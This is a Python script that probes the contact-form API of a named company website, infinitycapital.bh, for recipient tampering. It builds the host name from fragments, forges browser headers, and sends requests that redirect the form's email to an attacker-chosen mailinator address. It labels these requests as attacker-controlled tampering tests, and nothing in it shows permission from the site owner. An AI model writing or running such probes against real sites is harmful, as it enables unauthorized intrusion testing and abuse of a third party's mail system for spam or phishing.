#!/usr/bin/env python3
import urllib.request, urllib.parse, json, sys, time

HOST = "www." + "infinity" + "capital" + ".bh"
URL = "https://" + HOST + "/api/send"

def post(fields, label):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(URL, data=data, method="POST")
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36")
    req.add_header("Origin", "https://" + HOST)
    req.add_header("Referer", "https://" + HOST + "/contact")
    req.add_header("Accept", "application/json")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            body = r.read().decode(errors="replace")
            print(f"=== {label} ===")
            print("STATUS:", r.status)
            print("BODY:", body[:600])
            print("RAW_HDR:", dict(r.headers))
            print()
            return r.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        print(f"=== {label} ===")
        print("STATUS:", e.code)
        print("BODY:", body[:600])
        print()
        return e.code, body
    except Exception as e:
        print(f"=== {label} === EXC: {e}\n")
        return None, str(e)

base = {
    "fname": "Verify", "lname": "Tester",
    "areacode": "973", "tel": "17100004",
    "cname": "Verify Tester",
    "subject": "Investment Opportunities",
    "msg": "verification-control-ignore",
    "check": "on",
}

# T1: legit control -> CMS destination
f1 = dict(base); f1["targets"] = "info@infinitycapital.bh"
post(f1, "T1_LEGIT_targets=info@...")
time.sleep(1)
# T2: attacker-chosen external recipient (bare)
f2 = dict(base); f2["targets"] = "abuse-check-7719@mailinator.com"
post(f2, "T2_TAMPER_targets=external@mailinator.com")
time.sleep(1)
# T3: attacker-chosen external recipient (Name <addr>)
f3 = dict(base); f3["targets"] = "QA Tester <abuse-check-7719@mailinator.com>"
post(f3, "T3_TAMPER_targets=Name<external>")
